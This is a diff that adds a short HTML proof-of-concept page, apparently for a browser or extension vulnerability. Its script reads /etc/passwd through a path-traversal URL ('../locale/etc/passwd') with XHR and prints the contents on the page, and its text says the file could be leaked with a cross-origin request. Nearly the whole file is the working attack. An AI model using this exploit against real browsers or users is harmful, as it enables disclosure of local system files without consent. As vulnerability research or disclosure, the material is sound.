@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<title>extract</title>
+<p>
+    This file will load /etc/passwd as an example. Leaking it is just a matter
+    of sending a cross-origin request, much like leaking cookies.
+</p>
+<p>Here is its contents:</p>
+<pre></pre>
+<script>
+function retrieve(url) {
+    // fetch API sadly cannot load chrome:// resources, thus we use XHR
+    return new Promise((resolve, reject) => {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url);
+        xhr.onload = () => {
+            if (xhr.status === 200) {
+                resolve(xhr.responseText);
+            } else {
+                reject(Error(req.statusText));
+            }
+        };
+        xhr.onerror = () => reject(Error('Network error'));
+        xhr.send();
+    });
+}
+
+
+function show(content) {
+    document.querySelector('pre').textContent = content;
+}
+
+
+retrieve('../locale/etc/passwd').then(show, show);
+</script>
